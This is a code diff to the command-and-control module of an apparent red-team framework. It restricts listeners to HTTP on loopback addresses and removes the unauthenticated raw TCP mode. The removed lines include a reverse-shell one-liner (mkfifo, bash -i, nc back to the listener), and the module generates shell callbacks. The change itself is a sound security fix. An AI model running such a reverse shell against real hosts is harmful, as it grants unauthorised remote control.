@@ -1,5 +1,6 @@
 from __future__ import annotations
 
+import ipaddress
 import time
 
 from sqlalchemy import Engine
@@ -19,7 +20,31 @@ from axiom.modules.c2.schemas import (
 from axiom.modules.tasks.repository import TaskRepository
 from axiom.shared.clock import utcnow
 from axiom.shared.database import transaction
-from axiom.shared.errors import ConflictError, NotFoundError
+from axiom.shared.errors import ConflictError, DomainError, NotFoundError
+
+
+def _require_loopback_listener(kind: str, host: str) -> None:
+    """Reject listener kinds and bind addresses that must not be exposed.
+
+    The HTTP beacon carries a per-listener token and is meant to sit behind
+    Caddy at ``/c2/``; the raw TCP socket has neither a handshake nor a token,
+    so a reachable port would hand the session — and every command typed into
+    it — to whoever found it first.  Callers used to be trusted to pass a
+    sane host, which is how a listener ended up bound to ``0.0.0.0:443``.
+    """
+
+    if kind != "http":
+        raise DomainError(
+            f"只支持 http 监听器；{kind} 通道无握手无鉴权，已停用"
+        )
+    try:
+        address = ipaddress.ip_address(host)
+    except ValueError:
+        raise DomainError(f"监听地址必须是回环 IP，收到 {host!r}") from None
+    if not address.is_loopback:
+        raise DomainError(
+            f"监听地址只能是回环（127.0.0.1/::1），收到 {host}；对外由 Caddy 反代 /c2/"
+        )
 
 
 class C2Service:
@@ -40,6 +65,7 @@ class C2Service:
         ]
 
     def create_listener(self, task_id: str, body: CreateListener, *, actor: str) -> C2Listener:
+        _require_loopback_listener(body.kind, body.host)
         with transaction(self.engine) as conn:
             self._require_task(conn, task_id, allow_archived=False)
             existing = self.repository.list_listeners(conn, task_id)
@@ -63,6 +89,7 @@ class C2Service:
             listener = self._require_listener(conn, task_id, listener_id)
         if listener.archived:
             raise ConflictError("已归档 listener 不能启动")
+        _require_loopback_listener(listener.kind, listener.host)
         self.manager.start(listener)
         return self.get_listener(task_id, listener_id)
 
@@ -114,16 +141,8 @@ class C2Service:
                 "base64 回传避免二进制破坏。回连地址需目标可达。"
             )
             return C2Oneliner(listener_id=listener_id, kind="http", bash=bash, python=python, note=note)
-        bash = f"mkfifo /tmp/.axf; /bin/bash -i < /tmp/.axf 2>&1 | nc {host} {listener.port} > /tmp/.axf &"
-        return C2Oneliner(
-            listener_id=listener_id,
-            kind="tcp",
-            bash=bash,
-            note=(
-                "tcp 为原始 socket 会话：命令按行下发，输出读至 1.5s 静默。"
-                "该模式没有 token 握手，未鉴权；仅可在受信网络使用，公网请用 http 监听。"
-                "也可用 nc -e / socat 等自备方式回连。"
-            ),
+        raise DomainError(
+            f"只支持 http 监听器；{listener.kind} 通道无握手无鉴权，已停用"
         )
 
     # ------------------------------------------------------------ sessions
